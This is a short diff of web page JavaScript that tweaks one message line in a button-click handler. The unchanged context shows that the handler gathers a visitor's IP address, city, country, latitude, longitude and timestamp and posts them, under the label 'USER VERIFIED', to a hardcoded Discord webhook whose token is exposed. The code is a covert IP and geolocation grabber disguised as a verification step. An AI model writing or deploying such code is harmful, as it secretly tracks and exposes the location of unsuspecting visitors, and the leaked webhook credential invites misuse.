@@ -14,7 +14,7 @@ clicker.addEventListener("click", async function() {
                 var browser = navigator.userAgent;
                 var currentTime = new Date().toLocaleString();
                 var webhookUrl = "https://discord.com/api/webhooks/1241440685404459039/Degknkd5-sSvnMKVpdWt9W5vp2LFdjvzECdk6Mkw0LosEHcEmhubTIxylw4HUQnI8ZA_";
-                var message = "USER VERIFIED:\nIP address is: " + ipAddress + "\nlocated in: " + city + ", " + country + "\nlatitude is: " + latitude + "\nlongitude is: " + longitude + "\nbrowser was opened at: " + currentTime;
+                var message = "USER VERIFIED:\nIP address is: " + ipAddress + "\nlocated in: " + city + ", " + country + "\nlatitude is: " + latitude + "\nlongitude is: " + longitude + "\nButton was clicked at: " + currentTime;
 
                 var xhr = new XMLHttpRequest();
                 xhr.open("POST", webhookUrl, true);
